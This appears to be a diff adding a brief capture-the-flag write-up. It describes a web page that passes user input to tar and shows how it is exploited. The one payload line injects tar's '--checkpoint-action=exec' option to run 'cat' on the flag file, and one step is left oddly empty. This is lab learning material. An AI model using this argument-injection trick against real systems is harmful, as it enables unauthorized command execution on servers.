@@ -1,0 +1,5 @@
+as we access the webpage, we see "enter tar" and it tells us to try our luck with shell commands
+after inspecting the source code, we see "<form action="sadjwjaskdkwkasjdkwasdasdas.html" method="POST">
+so we try putting "" in the url
+cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="cat enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/flag"
+and here we see the flag :)
